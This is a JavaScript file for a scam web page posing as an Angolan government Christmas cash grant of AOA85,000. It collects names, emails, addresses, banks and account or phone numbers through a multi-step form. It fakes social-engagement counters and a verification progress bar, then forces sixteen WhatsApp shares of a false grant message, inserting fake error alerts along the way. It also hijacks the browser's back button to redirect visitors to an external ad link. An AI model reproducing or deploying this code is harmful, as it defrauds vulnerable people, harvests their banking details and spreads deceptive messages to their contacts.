
// Clear session storage on page load to reset the process
$(document).ready(function() {
    // FIXED: Remove the empty string key properly
    localStorage.removeItem('');
    localStorage.removeItem('formProgress');
    
    // Reset all form elements
    $('#name').val('');
    $('#email').val('');
    $('#state').val('');
    $('#add').val('');
    $('#gender').val('');
    $('#nums').val('');
    $('#bank').val('');
    $('#selectedRole').val('');
    $('.role-option').removeClass('selected');
    
    // Reset all display elements
    $('#getname').html('');
    $('#getnum').html('');
    $('#getadd').html('');
    $('#getemail').html('');
    $('#getstate').html('');
    $('#getgender').html('');
    $('#getbank').html('');
    $('#getrole').html('');
    
    // Reset all progress indicators
    $('#fill').css('width', '0%');
    $('#fill2').css('width', '0%');
    $('#percentage').text('0%');
    $('#percentage2').text('0%');
    $('#num').text('0%');
    
    // Show intro page
    $('#intro').show();
    $('#loader').hide();
    $('#info').hide();
    $('#checking').hide();
    $('#share').hide();
    $('#claim').hide();
    
    // Show comments section always (not hiding it on reload)
    $('.comments').show();
    
    // Reset form steps
    currentStep = 1;
    showStep(currentStep);
    
    // Reset dropdowns to show placeholder
    $('select').each(function() {
        $(this).val('');
    });
});

// Multi-step form functionality
let currentStep = 1;

function showStep(step) {
    $(".form-step").removeClass("active");
    $("#step" + step).addClass("active");
    
    $(".step").removeClass("active");
    $(".step").eq(step - 1).addClass("active");
    
    $(".step-line").removeClass("active");
    for (let i = 0; i < step - 1; i++) {
        $(".step-line").eq(i).addClass("active");
    }
}

// Role selection functionality
$(".role-option").click(function() {
    $(".role-option").removeClass("selected");
    $(this).addClass("selected");
    $("#selectedRole").val($(this).data("role"));
});

// Next button for step 1 (Role Selection)
$("#nextBtn1").click(function () {
    if ($("#selectedRole").val() === "") {
        alert("Please select your role to continue.");
        return;
    }
    currentStep = 2;
    showStep(currentStep);
});

// Next button for step 2 (Basic Information)
$("#nextBtn2").click(function () {
    if ($("#name").val().length < 4) {
        $(".error").fadeIn(500);
        return;
    }
    $(".error").fadeOut(500);
    currentStep = 3;
    showStep(currentStep);
});

// Next button for step 3 (Contact Details)
$("#nextBtn3").click(function () {
    currentStep = 4;
    showStep(currentStep);
});

// Previous buttons
$("#prevBtn1").click(function () { currentStep = 1; showStep(currentStep); });
$("#prevBtn2").click(function () { currentStep = 2; showStep(currentStep); });
$("#prevBtn3").click(function () { currentStep = 3; showStep(currentStep); });

// Live updates for application details
$("#email").on("input", function() { 
    $("#getemail").html($(this).val()).css("color", "#276a61"); 
});

$("#state").on("change", function() { 
    $("#getstate").html($(this).val()).css("color", "#276a61"); 
});

$("#bank").on("change", function() { 
    $("#getbank").html($(this).val()).css("color", "#276a61"); 
});

$("#gender").on("change", function() { 
    $("#getgender").html($(this).val()).css("color", "#276a61"); 
});

// Update account number and phone number in real-time
$("#nums").on("input", function() {
    $("#getnum").html($(this).val()).css("color", "#276a61");
});

$("#add").on("input", function() {
    $("#getadd").html($(this).val()).css("color", "#276a61");
});

// ORIGINAL JAVASCRIPT FUNCTIONALITY - UNCHANGED
var time = 0;
window.setInterval(function () {
    time = time + 1;
    $(".t1").html(time + 1 + "m");
    $(".t2").html(time + 2 + "m");
    $(".t3").html(time + 4 + "m");
}, 6e4);

var likes = 134,
    comments = 23,
    shares = 12;
window.setInterval(function () {
    likes = likes + Math.floor(Math.random() * 3);
    comments = comments + Math.floor(Math.random() * 2);
    shares = shares + Math.floor(Math.random() * 2);
    $("#likes").html(likes + "K");
    $("#comments").html(comments + "K comments");
    $("#shares").html(shares + "K shares");
}, 5e3);

$(".liked").click(function () {
    if ($(this).hasClass("selected")) {
        $(this).removeClass("selected");
        $(this).html("Like");
    } else {
        $(this).addClass("selected");
        $(this).html("Unlike");
    }
});

// Original functionality
$("#go").click(function () {
    $("#intro").fadeOut(0);
    $("#loader").fadeIn(1000);
    var i = 0;
    var interval = setInterval(function () {
        $("#num").text(i + "%");
        i += 1;
        if (i >= 100) {
            clearInterval(interval);
            $("#loader").fadeOut(0);
            $("#info").fadeIn(1000);
        }
    }, 50);
});

// Modified submit function to include all form data
$("#confirm").click(function () {
    if ($("#name").val().length < 4) {
        $(".error").fadeIn(500);
        return;
    }
    
    // Update all display fields
    $("#getname").html($("#name").val()).css("color", "#276a61");
    $("#getemail").html($("#email").val()).css("color", "#276a61");
    $("#getstate").html($("#state").val()).css("color", "#276a61");
    $("#getadd").html($("#add").val()).css("color", "#276a61");
    $("#getgender").html($("#gender").val()).css("color", "#276a61");
    $("#getnum").html($("#nums").val()).css("color", "#276a61");
    $("#getbank").html($("#bank").val()).css("color", "#276a61");
    $("#getrole").html($("#selectedRole").val().charAt(0).toUpperCase() + $("#selectedRole").val().slice(1)).css("color", "#276a61");
    
    $("#info").fadeOut(0);
    $("#checking").fadeIn(1000);
    var i = 0;
    var interval = setInterval(function () {
        i += 1;
        $("#percentage").text(i + "%");
        $("#fill").css("width", i + "%");
        if (i == 50) {
            i = 49;
            setTimeout(function () {
                i = 50;
            }, 1000);
        }
        if (i >= 100) {
            clearInterval(interval);
            $("#load").fadeOut(0);
            $("#check").fadeIn(0);
            setTimeout(function () {
                $("#checking").fadeOut(0);
                $("#share").fadeIn(1000);
            }, 500);
        }
    }, 50);
});

$(document).click(function () {
    if ($("#name").is(":focus")) {
        $(".error").fadeOut(500);
    }
});

// WhatsApp sharing functionality
var text1 ="*APPLY FOR AOA85,000 CHRISTMAS CASH GRANT*%0A%0AAre you a citizen of Angola? The Angolan Government has approved the payment of *AOA85,000 CHRISTMAS CELEBRATION CASH GRANT* for all Angolans across the regions.%0A%0AAPPLY HERE👉: https://phlug.org/angola-xmas %0A%0ASHARE WITH OTHERS TO BENEFIT.",
    text2 = " an amount of ",
    text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly Ã°Å¸â€˜â€° ",
    error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
    abcde = "http://outrotomr.com/4/3144603",
    saved = "",  // ORIGINAL - empty string
    share = "whatsapp://send?text=" + text1;

// WhatsApp sharing progress functionality - ORIGINAL LOGIC
var swidth = localStorage.getItem(saved);
if (swidth !== null) {
    var width = swidth * 1;
    $("#intro").fadeOut(0);
    $(".comments").fadeOut(0);  // ORIGINAL - hides comments
    $("#share").fadeIn(0);
    $("#fill2").css("width", width + "%");
    $("#percentage2").text(width + "%");
} else {
    var width = 0;
}

$("#whatsapp").click(function () {
    window.location.href = share;
    
    // ORIGINAL 16-SHARE PROGRESSION
    if (width == 0) {
        width += 50;  // 1st share = 50%
    } else if (width == 50) {
        alert(error);
        width += 15;  // 2nd share = 65%
    } else if (width == 65) {
        width += 5;   // 3rd share = 70%
    } else if (width == 70) {
        alert(error);
        width += 10;  // 4th share = 80%
    } else if (width == 80) {
        alert(error);
        width += 5;   // 5th share = 85%
    } else if (width == 85) {
        width += 2;   // 6th share = 87%
    } else if (width == 87) {
        width += 1;   // 7th share = 88%
    } else if (width == 88) {
        width += 2;   // 8th share = 90%
    } else if (width == 90) {
        width += 1;   // 9th share = 91%
    } else if (width == 91) {
        width += 1;   // 10th share = 92%
    } else if (width == 92) {
        width += 1;   // 11th share = 93%
    } else if (width == 93) {
        width += 1;   // 12th share = 94%
    } else if (width == 94) {
        width += 1;   // 13th share = 95%
    } else if (width == 95) {
        width += 1;   // 14th share = 96%
    } else if (width == 96) {
        width += 2;   // 15th share = 98%
    } else if (width == 98) {
        width += 2;   // 16th share = 100%
        $("#share").fadeOut(0);
        $("#claim").fadeIn(1000);
        localStorage.removeItem(saved); // Clear progress after completion
        return;
    }
    
    localStorage.setItem(saved, width);
    setTimeout(function () {
        $("#fill2").css("width", width + "%");
        $("#percentage2").text(width + "%");
    }, 2000);
});

$("#offer").click(function () {
    window.open(abcde, "_blank");
});

// Account number and phone number functionality - Fixed
$(document).ready(function() {
    $('#nums').on('input', function() {
        $('#getnum').html($(this).val()).css('color', '#276a61');
    });
    
    $('#add').on('input', function() {
        $('#getadd').html($(this).val()).css('color', '#276a61');
    });
});

// Browser navigation prevention
window.onhashchange = function(){jp();};
function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
function jp() { fh(); }
setTimeout('hh();', 500);
function fh(){
    location.href = "http://outrotomr.com/4/3144603";
}
function goon(){
    location.href = "http://outrotomr.com/4/3144603";
}



// Cookie functions
function set_Cookie(name,value){
    var Days = 30;
    var exp = new Date();
    exp.setTime(exp.getTime() + (Days*20*1000));
    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
}

function get_Cookie(name){
    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
    if(arr=document.cookie.match(reg)){
        return unescape(arr[2]);
    }
    return '';
}

// Fix for select dropdown display
$(document).ready(function() {
    // Add event listeners to all form fields to ensure they update the display
    $('#name').on('input', function() {
        $('#getname').html($(this).val()).css('color', '#276a61');
    });
    
    $('#email').on('input', function() {
        $('#getemail').html($(this).val()).css('color', '#276a61');
    });
    
    // Force update when form is submitted
    $('#confirm').click(function() {
        // Ensure all values are captured
        setTimeout(function() {
            $('#getnum').html($('#nums').val()).css('color', '#276a61');
            $('#getadd').html($('#add').val()).css('color', '#276a61');
        }, 100);
    });
});
